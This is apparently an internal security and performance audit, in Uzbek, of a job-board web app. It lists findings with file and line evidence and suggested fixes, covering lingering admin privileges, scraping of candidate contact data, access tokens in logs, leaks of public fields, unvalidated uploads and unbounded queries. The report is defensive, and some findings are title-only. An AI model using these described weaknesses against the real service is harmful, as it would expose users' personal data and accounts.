evidence: apps/web/src/lib/useRoleGuard.ts:130-158; apps/web/src/components/AdminShell.tsx:57-92; apps/web/src/pages/**/+guard.ts ro'yxati (employer/admin uchun yo'q).
recommended_fix: Hozirgi arxitekturada minimal: useRequireRole'ga `status === "loading" || status === "guest"` bo'lganda sahifa kontenti o'rniga skeleton qaytaradigan `<RequireRole>` wrapper (AdminShell naqshi) va `navigate()` (vike/client/router) bilan client-side redirect (+ `next` param, #9). Server-side guard uchun kelajakda: SSR'da API'ga cookie forward (cookie path'ini kengaytirish) — katta o'zgarish, hozir tavsiya etilmaydi.
dependencies: #9 (next param); barcha useRequireRole ishlatuvchi 12 sahifa.

title: returnTo/next yo'q — login har doim "/" ga tashlaydi; guard'lar maqsad sahifani yo'qotadi (open redirect yo'qligi tasdiqlandi)
root_cause: login/+Page.tsx:32 va :95 `window.location.assign(l("/"))`; useRoleGuard.ts:136 mehmonni `l("/login")` ga hech qanday parametrsiz yuboradi; AdminShell.tsx:79 ham. signup done() (signup/+Page.tsx:34) ham qat'iy. Hech qaysi sahifa `next`/`returnTo` query o'qimaydi (grep bo'sh) — demak open redirect ham yo'q.
impact: Foydalanuvchi /vacancy/x ga "Ariza berish" bosib login qilsa bosh sahifaga qaytadi; /employer/vacancies/new dan login'ga yuborilgan employer yana yo'lni qidiradi. Konversiyaga bevosita ta'sir.
evidence: apps/web/src/pages/login/+Page.tsx:32,95; apps/web/src/pages/signup/+Page.tsx:34; apps/web/src/lib/useRoleGuard.ts:133-142; apps/web/src/components/AdminShell.tsx:79.
recommended_fix: useRequireRole va Header login havolasida `l("/login") + "?next=" + encodeURIComponent(location.pathname + location.search)`. Login/signup'da `next` ni faqat `^/(?!/)` (relative, `//` va `\` emas, `http` emas) bo'lsa ishlating, aks holda `/`. SocialLogin onDone ham shu yo'lni olsin.
dependencies: Header.tsx login tugmasi; SocialLogin.tsx onDone; i18n prefiksli yo'llar (l()) bilan mos bo'lishi.
fix_risk: Past — validatsiya qat'iy bo'lsa open redirect kiritilmaydi.

title: Admin paneli requireRole (token roli) bilan himoyalangan — team/articles esa requireStaff (bazadagi rol + blok); demoted/bloklangan admin 15 daqiqa to'liq huquq bilan qoladi
root_cause: `adminOnly = [requireAuth, requireRole("admin")]` (admin.routes.ts:19) faqat JWT payload'dagi `role` ni o'qiydi (auth-guard.ts:25–30). requireStaff (auth-guard.ts:38–45) ataylab bazadan o'qiydi va team.routes.ts:25, articles.admin.routes.ts:39 da ishlatiladi. Blok tekshiruvi faqat seans berishda (auth.service.ts:373–386). Xuddi shu holat employer→job_seeker rol o'zgarishi va foydalanuvchi bloklanganda ham: requireRole/requireAuth bazani tekshirmaydi.
impact: Admin A adminni B ni bloklasa yoki rolini pasaytirsa, B access token muddati (15 min) ichida foydalanuvchilarni bloklash, rol berish (`/api/admin/users/:id/role` → o'ziga qayta admin), vakansiya moderatsiyasi, broadcast qila oladi. Bloklangan employer/candidate ham 15 min davomida yozadi/ariza yuboradi/chat qiladi (WS ham).
evidence: admin.routes.ts:19; auth-guard.ts:25-30 `roles.includes(req.user.role)`; auth-guard.ts:33-36 izoh: 'Admin paneli ... BAZADAGI rol tekshiriladi' — admin.routes.ts bunga amal qilmaydi.
recommended_fix: admin.routes.ts:19 → `requireStaff("admin")`. Mutatsion yo'llar (vacancy POST/PUT, apply, conversations/start, WS message) uchun `requirePhoneVerified` allaqachon bazaga boradi — o'sha so'rovda `isBlocked` ni ham tekshirib 403 USER_BLOCKED qaytarish (bitta select'ga `isBlocked: true` qo'shish).
dependencies: Yo'q.

title: PATCH /api/applications/:id/status — holat mashinasi yo'q (istalgan → istalgan, takroriy), har safar tarix + bildirishnoma; admin suhbatda 'employer' bo'lib qoladi
root_cause: statusSchema (18–21) faqat enum; joriy holat bilan solishtirish yo'q. `accepted → viewed`, `rejected → rejected` (100 marta) qabul qilinadi — har biri `applicationStatusHistory.create` (231) + `notify` (262). `reason` bo'lsa `getOrCreateConversation(req.user.sub, ...)` (244) — admin uchun `employerUserId = adminId`, `companyId` bilan; keyin bu suhbat kompaniya egasiga ko'rinmaydi. Status yo'li `requirePhoneVerified` talab qilmaydi (vacancy POST talab qiladi) — telefon tasdiqsiz employer nomzodga xabar yozadi.
impact: Nomzodga cheksiz 'holat o'zgardi' bildirishnomalari (Telegram/push/email) — spam; ariza tarixida mantiqsiz yozuvlar (accepted → sent bo'lmasa ham accepted → viewed); nomzod sahifasidagi 'Faoliyat' ishonchsiz. 50k ariza x takror tarix — hajm.
evidence: applications.routes.ts:210-240 — `application.status === status` tekshiruvi yo'q; :244-251 admin ham `senderId: req.user.sub`.
recommended_fix: `if (application.status === status) return application;` + ruxsat etilgan o'tishlar jadvali (`sent→viewed|invited|rejected`, `viewed→invited|rejected`, `invited→accepted|rejected`, `accepted/rejected` — faqat admin qaytaradi) → 409. preHandler'ga `requirePhoneVerified`. Admin uchun suhbat yaratmaslik (faqat holat + notify).
dependencies: Frontend EmployerApplicationsView amallar tugmalari mos kelishi (hozir ham holatga qarab ko'rsatadi bo'lsa kerak — tekshirish).
fix_risk: O'rta — e2e-check.mjs:342 `toSent` kabi testlar o'tishlarga moslashtiriladi.

title: /api/candidates: har bir nomzodning email+telefonini istalgan employer (telefon/kompaniya tasdiqsiz) skreyp qiladi; draft rezyumelar ham chiqadi; `region` parametri tekshirilmagan (500)
root_cause: `user: { select: { id, email, phone } }` (273) va javobda `email`, `phone` (311–312) — suhbat yoki ariza bo'lmasa ham. `resumes: { some: {} }` (253) status filtrsiz — `ResumeStatus draft` (schema.prisma:58–61) ham 'rezyumesi bor' hisoblanadi va draft mazmuni (summary, tajriba) chiqadi. `query.region` (246, 254) `regionId: query.region` — 24-hex bo'lmasa P2023 → 500. `take: 50`, offset yo'q, `text` bo'yicha bo'lak-bo'lak enumeratsiya mumkin. preHandler'da requirePhoneVerified yo'q.
impact: 4-topilma (402 olib tashlangach) bilan birga: bepul, telefon tasdiqlanmagan employer hisobi 10k nomzodning telefon/email bazasini text filtrlari bilan yig'adi. Nomzod hali e'lon qilmagan (draft) rezyumesi ko'rinadi.
evidence: candidates.routes.ts:246 `req.query as { text?: string; region?: string }` — zod yo'q; :253 `resumes: { some: {} }`; :273, :311-312.
recommended_fix: preHandler: `requirePhoneVerified`; where: `resumes: { some: { status: "published" } }` va include'da ham `where: { status: "published" }`; query zod: `region: objectId().optional()`, `text: max(100)`, `page/pageSize` (skip/take); javobda `phone`/`email` ni faqat mavjud suhbat/ariza bo'lsa berish (yoki 'Bog'lanish' tugmasi conversations/start orqali).

title: Employer/admin istalgan job_seeker bilan (ariza/aloqa bo'lmasa ham) suhbat ochadi; keyin /api/users/:id/summary orqali yopiq profilni ko'radi; sharh mualliflari userId bilan ochiq
root_cause: `POST /api/conversations/start` (146–151): faqat `candidate.role === "job_seeker"` tekshiriladi — ariza, isOpenToWork, rezyume talab qilinmaydi; `admin` roli ham employer sifatida suhbat yaratadi (kompaniyasiz). `/api/users/:id/summary` (400–412) 'oramizda suhbat bor' shartiga tayanadi, lekin suhbatni employer o'zi yaratadi → shart bo'sh. Summary `isOpenToWork=false` va draft rezyumeni ham beradi (417–426). Nomzod ID'lari `GET /api/companies/:slug` reviews.userId (companies.routes.ts:189) va /api/candidates dan olinadi.
impact: Ish beruvchi salbiy sharh yozgan nomzodni userId orqali topib, unga to'g'ridan-to'g'ri yozadi (retaliation), ish qidirmayotgan (isOpenToWork=false) nomzodning ism/skill/rezyume sarlavhasini ko'radi. Spam vektori (requirePhoneVerified yumshatadi, ammo bitta tasdiqlangan telefon yetarli).
evidence: chat.routes.ts:146-151; :400-412 `conversation.findFirst({ OR: [...] })` → `if (!conv) throw forbidden`; :420-424 `resumes: { take: 1 }` status filtrsiz; companies.routes.ts:189 `userId: true`.
recommended_fix: start: employer uchun `candidateUserId` ga ruxsat sharti: (a) nomzod ushbu employer kompaniyasi vakansiyasiga ariza bergan (`application.findFirst({ jobSeekerId, vacancy: { company: { ownerUserId: me } } })`) YOKI (b) `jobSeekerProfile.isOpenToWork && resumes.some({status:"published"})`. Admin rolini start'dan chiqarish (yoki alohida 'support' oqimi). summary: `resumes.where.status = "published"`. Public sharhlarda `userId` ni olib tashlash.
dependencies: 7-topilma (reviews.userId); frontend EmployerApplicationsView.tsx:181 (arizachi uchun — (a) sharti bilan ishlaydi), CompanyActions.tsx (seeker→company — o'zgarmaydi).
fix_risk: O'rta — /employer/candidates sahifasidan 'yozish' tugmasi (b) shartiga mos bo'lishi kerak.

title: WS access token URL query'da — Fastify request log'iga to'liq yoziladi; WS xabar yuborishda blok/telefon tasdiqlash/limit tekshiruvi yo'q
root_cause: `/ws/chat?token=<accessToken>` (71–76); `Fastify({ logger: true })` (server.ts:135–141) har 'incoming request' uchun `req.url` ni (query bilan) log'laydi — token 15 daqiqa davomida log'da. WS message handler (83–134) faqat suhbat ishtirokchisi ekanini tekshiradi: `isBlocked`, `isPhoneVerified` (REST start'da bor), xabar chastotasi tekshirilmaydi; ulanish token muddati tugagach ham ochiq qoladi (qayta tekshiruv yo'q).
impact: Log agregatorlari (Railway) orqali kirish tokenlari sizadi; bloklangan yoki telefon tasdiqlanmagan foydalanuvchi mavjud suhbatlarda cheksiz xabar (+ Telegram bildirishnoma, 128–133) yuboradi.
evidence: chat.routes.ts:75-76 `url.searchParams.get("token")`; server.ts:135-141 `logger: true` — `disableRequestLogging`/serializer yo'q; chat.routes.ts:107-113 hech qanday limit.
recommended_fix: Token'ni `Sec-WebSocket-Protocol` subprotokoli orqali yuborish (brauzer `new WebSocket(url, ["bearer", token])`) yoki qisqa muddatli (30s) bir martalik `POST /api/chat/ticket`; server.ts log serializer'da `/ws/chat` url'ini qisqartirish. WS handler'da ulanishda `user.findUnique({ isBlocked, isPhoneVerified })` va soddagina per-socket rate-limit (masalan 20 xabar/10s); token `exp` dan keyin socket'ni yopish.
dependencies: Frontend WS klienti (apps/web) token uzatish usuli.
fix_risk: O'rta — klient/server bir vaqtda o'zgaradi (ikkala usulni vaqtincha qo'llab-quvvatlash mumkin).

title: Ochiq javoblarda kompaniyaning ichki maydonlari (ownerUserId, stir, legalName, subscriptionPlanId/ExpiresAt) va sharh muallifining userId'si chiqadi
root_cause: `GET /api/companies/:slug` `findUnique` + `include` — Company'ning barcha skalyarlari (schema.prisma:301–319) mehmonga qaytadi; `reviews.select.userId` (189) ochiq. `GET /api/vacancies` va `/api/vacancies/:slug` — `LIST_INCLUDE = { company: true }` (vacancies.service.ts:35) va getVacancyBySlug `company: { include }` (344–351) — har bir kartada to'liq Company. OG route ham `company: true` (og.routes.ts:201). Nomzod endpointlari (applications 109, favorites 43) esa to'g'ri whitelist qiladi; e2e (377–380, 777) faqat o'sha yo'llarni tekshiradi.
impact: Mehmon har qanday kompaniyaning egasi user ID'si, STIR, yuridik nomi, obuna holatini ko'radi; ownerUserId + reviews.userId boshqa endpointlarda ID sifatida ishlatiladi (masalan conversations/start candidateUserId — 11-topilma). Ro'yxat javobi 20–50 kartada ortiqcha maydonlar bilan shishadi (scale).
evidence: companies.routes.ts:177-199 `findUnique({ where: { slug }, include: {...} })` — `select` yo'q; :189 `userId: true`; vacancies.service.ts:35 `const LIST_INCLUDE = { company: true, region: true, category: true }`.
recommended_fix: Umumiy `PUBLIC_COMPANY_SELECT = { id, name, slug, logoUrl, description, website, industry, employeeCount, foundedYear, isVerified, regionId/region, images, createdAt }` konstantasi (companies.list.ts CompanyListItem ga mos) va uni LIST_INCLUDE, getVacancyBySlug, similarVacancies, companies/:slug, og'da ishlatish. Sharhlarda `userId` o'rniga server tomonida `mine` (ixtiyoriy token bilan) yoki umuman olib tashlash.
dependencies: Frontend api.ts vakansiya/kompaniya adapterlari faqat ochiq maydonlarni o'qishini tekshirish (apps/web/src/lib/api.ts:199 atrofidagi mapper).
fix_risk: O'rta — frontend `company.ownerUserId`/`reviews[].userId` ga tayangan bo'lsa (masalan 'mening sharhim' belgisi) moslashtirish kerak.

title: POST /api/companies (frontend ishlatmaydi) — employer cheksiz kompaniya yaratadi, stir/legalName va `javascript:` website qabul qiladi; hamma joyda `findFirst` — qaysi kompaniya 'meniki' aniqmas
root_cause: 211–221 da mavjud kompaniya tekshirilmaydi; `createCompanySchema` (22–29) `stir`, `legalName` ni oladi (PUT /api/employer/company 31–39 olmaydi), `website: z.string().url()` `javascript:`/`data:` sxemalarini o'tkazadi (PUT esa normalizeWebsite 42–46 bilan https majburlaydi). Egalik har joyda `company.findFirst({ ownerUserId })` orderBy'siz: vacancies.routes.ts:136, companies.routes.ts:73/88/130/164, candidates.routes.ts:238, chat.routes.ts:150, billing.routes.ts:56/76/108. Telefon tasdiqlash talab qilinmaydi.

title: `:id` parametrli ~25 endpoint ObjectId formatini tekshirmaydi → Prisma P2023 → 500 INTERNAL_ERROR

title: PDF rezyume autentifikatsiyasiz /uploads'da ochiq, "o'chirish" faylni diskdan o'chirmaydi
root_cause: Fayl UPLOAD_DIR'ga `resume-<userId>-<ms>.pdf` nomi bilan yoziladi va fastifyStatic orqali hammaga ochiq beriladi (server.ts:107). DELETE faqat resumeUrl=null qiladi (127-129). Qayta yuklashda eski fayl ham o'chirilmaydi. Mimetype mijoz sarlavhasidan olinadi, magic bytes tekshirilmaydi.

title: Apply oqimi: login returnTo yo'q, rezyume holati xatoda noto'g'ri "rezyumeni to'ldiring" deydi

Vakansiya, sharh va saqlash tugmalari oddiy l("/login") beradi (VacancyDetailView.tsx:48, CompanyReviews.tsx:256). (2) useApplication: fetchResume xatoda null → resume=null, resumeKnown esa arizalar so'rovidan true bo'ladi (47-56) → needsResume true (ApplyCard.tsx:23-25) va rezyumesi bor nomzodga apply tugmasi o'rniga "Rezyumeni to'ldiring" chiqadi.

title: Admin broadcast 10k foydalanuvchiga bitta HTTP so'rov ichida ketma-ket notify() qiladi; Telegram/email fire-and-forget oqimi cheksiz
root_cause: user.findMany chegarasiz (510-513), keyin `for ... await notify()`. Har notify: prefs query + notification insert + (void) telegram user lookup + sendMessage + (void) push subs + (void) email user lookup + sendMail (notifications.service.ts:269-326). void qilingan kanallar parallel to'planadi, rate-limit ham yo'q.
impact: 10k × ~5 DB so'rov ≈ 50k round-trip, taxminan 2-5 daqiqa. Railway/Vercel proxy timeout'iga uriladi, admin qayta bossa hammasi ikki marta yuboriladi (idempotency yo'q). Telegram 30 msg/s limiti oshib, xabarlar jim yo'qoladi. SMTP'ga bir vaqtda minglab ulanish ochiladi (transport pool yo'q, mailer.ts). Har broadcast 10k Notification hujjati qo'shadi, retention yo'q.
evidence: admin.routes.ts:500-526; notifications.service.ts:305-325 `void notifyUserViaTelegram`, `void sendUserEmail`; mailer.ts'da `pool: true` yo'q.
recommended_fix: Endpoint 202 qaytarsin, ishni fon job'ida bajarsin (modul darajasida bitta aktiv broadcast lock bilan). In-app qismini `notification.createMany` bilan 500 lik batch'larda yozing, userId'larni cursor bilan o'qing. Telegram/email kanallarini broadcast'da default o'chiring (`channels: ["in_app"]`) yoki concurrency-limitli navbat (masalan 20/s) qiling. nodemailer'da `pool: true, maxConnections: 5` yoqing. Notification uchun retention (masalan 180 kun, createdAt TTL index) ko'rib chiqing.
dependencies: notifyMany (notifications.service.ts:347) ham xuddi shu ketma-ket naqshda
fix_risk: O'rta: javob shakli {sent} → {queued} bo'ladi, admin UI'ni moslashtirish kerak

title: Alerts sweep: 5k saved search xotiraga yuklanadi, ketma-ket 5k listVacancies ishlaydi, reentrancy guard yo'q, shuning uchun takroriy bildirishnoma ketishi mumkin
root_cause: findMany'da take/cursor yo'q (355-358). Har search uchun listVacancies bajariladi (count + findMany, LIST_INCLUDE bilan to'liq company/category/region, publishedAt filtri SO'ROVDA emas, faqat xotirada 389-390), keyin update. setInterval (454) oldingi tick tugashini kutmaydi. Update notify'dan OLDIN, lekin listVacancies'dan KEYIN bajariladi, shuning uchun overlap bo'lsa ikkala sweep ham eski lastNotifiedAt'ni o'qib, bir xil vakansiyalar uchun ikki marta notify qiladi. /api/admin/alerts/run (admin.routes.ts:497) ham parallel ishga tushishi mumkin.
impact: 5k × (2-3 query, text filtrda regex+lookup 50-200ms) ≈ 5-15 daqiqa. Bu 15 daqiqalik intervalga yaqin yoki undan uzun, natijada sweep'lar ustma-ust tushib dublikat in-app/Telegram/email yuboriladi va DB doimiy yuk ostida qoladi. 20 dan ortiq yangi vakansiya bo'lsa soni 20 ga kesiladi.
evidence: alerts.service.ts:355-358, 363-429, 386-387 `pageSize: 20`, 441-455 setInterval.
recommended_fix: (1) Modul darajasida `running` flag qo'shing, tick band bo'lsa skip qilinsin (admin run ham shu flag orqali). (2) Query'ga `publishedAt: { gt: lastNotifiedAt }` qo'shing (VacancyListQuery'ga publishedAfter maydoni), select'ni id/title/slug/publishedAt bilan cheklang. (3) savedSearch'larni cursor bilan 200 tadan o'qing. Where'da daily uchun `lastNotifiedAt < now-20h` sharti bo'lsin, `@@index([emailAlertsEnabled, lastNotifiedAt])` qo'shing. (4) lastNotifiedAt'ni shartli update qiling (`where: { id, lastNotifiedAt: old }`), shunda faqat bitta sweep notify qiladi.
dependencies: listVacancies'ga publishedAfter qo'shish kerak (vacancies.service.ts buildFilters)

title: GET /api/employer/applications: pagination yo'q, relation-filter $lookup, har arizaga to'liq rezyume (experience/education/skills) qo'shiladi
root_cause: `where: { vacancy: { company: { ownerUserId } } }` Prisma Mongo'da applications kolleksiyasi bo'yicha $lookup(vacancies)→$lookup(companies) bo'lib bajariladi, ya'ni 50k arizaning har biri uchun 2 lookup. Take/cursor yo'q. Har qatorga resume include (experience+education+skills), statusHistory va vacancy._count qo'shiladi. Client esa hammasini xotirada filter/sort/paginate qiladi (EmployerApplicationsView.tsx:108-110, lib/list.ts). Resume massivlari validatsiyada cheklanmagan (resume.routes.ts:381-383, `.max` yo'q).
impact: Faol employer (masalan 2k ariza × ~5-10KB rezyume) 10-20MB JSON oladi. Har ochilishda butun collection bo'yicha 100k lookup bajariladi. /api/applications (seeker, 93-119) va favorites ham to'liq yuklanadi, lekin ular per-user kichik. useApplication.ts:47 esa vakansiya detail sahifasida bitta holatni bilish uchun nomzodning barcha arizalarini yuklaydi.
evidence: applications.routes.ts:128-177; EmployerApplicationsView.tsx:98-110 `fetchEmployerApplicationList` → `paginate(filtered, ...)`; lib/list.ts:1-5 izohi "backend butun ro'yxatni bitta javobda qaytaradi".
recommended_fix: Minimal va backward-compatible yo'l: avval employer company id'larini oling, keyin vacancyId'larni (`vacancy.findMany({where:{companyId:{in}}, select:{id}})`), so'ng `application.findMany({ where: { vacancyId: { in } } })` bajaring, bu indeks va lookup'siz ishlaydi. Ro'yxatga `take` (masalan 500) + `hasMore` qo'shing. Rezyume detalini alohida `GET /api/applications/:id` orqali lazy yuklang, ro'yxatda faqat resume { id, title } qolsin. `@@index([vacancyId, createdAt])` qo'shing. Seeker holati uchun `GET /api/vacancies/:id/my-application` kabi yengil endpoint qo'shing. Resume schema massivlariga `.max(50)` qo'ying.
dependencies: Frontend adapter (lib/employer/applications/adapter.ts) rezyumeni detail'dan olishga moslashishi kerak. Inbox summary fix'i bilan bir xil helper ishlatilishi mumkin
fix_risk: O'rta: client-side filter/count'lar to'liq ro'yxatga tayanadi; take qo'shilsa statusCounts server'dan kelishi kerak

title: /api/inbox/summary har 20 soniyada relation filter bilan application.count bajaradi (har employer tab uchun)
root_cause: `application.count({ where: { vacancy: { company: { ownerUserId } }, status: "sent" } })`: status bo'yicha indeks yo'q, relation filter $lookup bo'ladi. useInboxSummary.ts:29 har 20s + har focus'da chaqiradi. Bundan tashqari conversation.findMany (select id) ham chegarasiz va message.count `conversationId in [...]` bilan.
impact: 100 ta online employer tab × 3 so'rov/daqiqa × 50k ariza lookup ≈ daqiqasiga 15M hujjat-lookup. Bu faqat header badge uchun. Mongo CPU'si shu polling bilan to'lib qolishi mumkin.
evidence: chat.routes.ts:466-485; apps/web/src/lib/useInboxSummary.ts:29 `window.setInterval(refresh, 20000)`.
recommended_fix: Employer vakansiya id'larini oldindan resolve qilib `application.count({ where: { vacancyId: { in: ids }, status: "sent" } })` ishlating va `@@index([vacancyId, status])` qo'shing. Polling'ni 60s'ga oshiring (WS ulanib turgan bo'lsa polling'ni o'chiring). Ixtiyoriy: userId bo'yicha 10-15s in-memory cache.
dependencies: employer applications fix'idagi vacancyIds helper bilan umumiy

title: Suhbat xabarlari va suhbatlar ro'yxati chegarasiz; har ochilishda to'liq tarix va har suhbatga company.description qaytadi
root_cause: GET /api/conversations/:id/messages: `findMany({ where: { conversationId }, orderBy: createdAt asc })`, take/cursor yo'q. GET /api/conversations (168-191) ham take'siz, har suhbatga company.description (≤2000 belgi) qo'shiladi, `messages take 1` include esa har suhbat uchun alohida sub-query (Prisma batching). Keyin application.findMany `jobSeekerId in [...]` va relation filter bilan (206-233) chegarasiz.
impact: Faol employer: 1 000 suhbat × ~2.5KB ≈ 2.5MB. Uzun suhbat: 5 000 xabar × 0.3KB ≈ 1.5MB, WS reconnect/refresh'da qayta yuklanadi. 100k xabar hajmida alohida user uchun ham bounded emas.
evidence: chat.routes.ts:166-191, 206-233, 321-325; schema.prisma:544 `@@index([conversationId, createdAt])` (cursor uchun tayyor indeks bor).
recommended_fix: Messages: `?before=<createdAt|id>&limit=50` cursor, default oxirgi 50 ta (desc + reverse), web'da "oldingilarni yuklash".
